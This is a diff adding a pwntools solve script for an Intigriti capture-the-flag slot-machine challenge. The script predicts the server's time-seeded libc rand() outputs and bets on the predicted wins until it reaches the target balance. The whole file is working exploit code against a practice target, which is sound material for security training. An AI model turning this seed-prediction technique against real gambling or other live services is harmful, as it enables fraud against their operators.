@@ -1,0 +1,89 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+import ctypes
+import time
+
+warnings.filterwarnings("ignore")
+exe = ELF("./rigged_slot1e")
+# context.log_level='debug'
+# p = remote("riggedslot1.ctf.intigriti.io", 1332)
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+#
+# sla = lambda msg, data: p.sendlineafter(msg, data)
+# sa = lambda msg, data: p.sendafter(msg, data)
+# sl = lambda data: p.sendline(data)
+# s = lambda data: p.send(data)
+# Load the C standard library (libc)
+libc = ctypes.CDLL("libc.so.6")
+
+# Seed the random number generator with the current time (like srand in C)
+libc.srand(int(libc.time()))
+
+# gdbs()
+
+while True:
+    p = remote("riggedslot1.ctf.intigriti.io", 1332)
+    # p.sendlineafter("name:","name")
+    balance = 0
+    while True:
+        rand = libc.rand()%1000
+        log.info(f"{hex(rand) = }")
+        if rand <= 0x1d and rand > 0x13:
+            if balance >=100:
+                p.sendlineafter("your bet amount (up to $100 per spin):","100")
+            elif balance < 100:
+                p.sendlineafter("your bet amount (up to $100 per spin):",str(balance))
+        elif rand <= 0x13 and rand > 0xe:
+            if balance >=100:
+                p.sendlineafter("your bet amount (up to $100 per spin):","100")
+            elif balance < 100:
+                p.sendlineafter("your bet amount (up to $100 per spin):",str(balance))
+        elif rand <= 0xe and rand> 9:
+            if balance >=100:
+                p.sendlineafter("your bet amount (up to $100 per spin):","100")
+            elif balance < 100:
+                p.sendlineafter("your bet amount (up to $100 per spin):",str(balance))
+        elif rand <=9  and  rand > 0:
+            if balance >=100:
+                p.sendlineafter("your bet amount (up to $100 per spin):","100")
+            elif balance < 100:
+                p.sendlineafter("your bet amount (up to $100 per spin):",str(balance))
+        # elif rand <=4 and rand > 0:
+        #     p.sendlineafter("your bet amount (up to $100 per spin):",str(balance))
+        elif rand == 0:
+            if balance >=100:
+                p.sendlineafter("your bet amount (up to $100 per spin):","100")
+            elif balance < 100:
+                p.sendlineafter("your bet amount (up to $100 per spin):",str(balance))
+        else:
+            p.sendlineafter("your bet amount (up to $100 per spin):","1")
+        p.recvuntil("Current Balance: $")
+        balance = int(p.recvuntil("\n"))
+        if balance <=0 or balance >= 1337420:
+            p.close()
+            break
+    if balance >= 1337420:
+        p.close()
+        break
+
+
+
+
+
+
+
+
+
+
+
+# p.interactive()
+# good luck pwning :)
+
